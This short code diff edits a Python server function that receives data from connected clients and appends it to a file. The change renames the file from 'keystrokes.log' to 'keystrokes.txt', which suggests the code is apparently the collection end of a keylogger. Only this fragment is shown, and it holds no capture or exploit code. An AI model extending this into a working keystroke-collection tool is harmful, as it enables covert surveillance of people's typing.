@@ -66,7 +66,7 @@ def handle_client_connection():
             if data:
                 print(f"Received: {data}")
                 # Save received data to a log file
-                with open("keystrokes.log", "a") as file:
+                with open("keystrokes.txt", "a") as file:
                     file.write(data + "\n")
             else:
                 # If no data is received, it usually means the client has disconnected
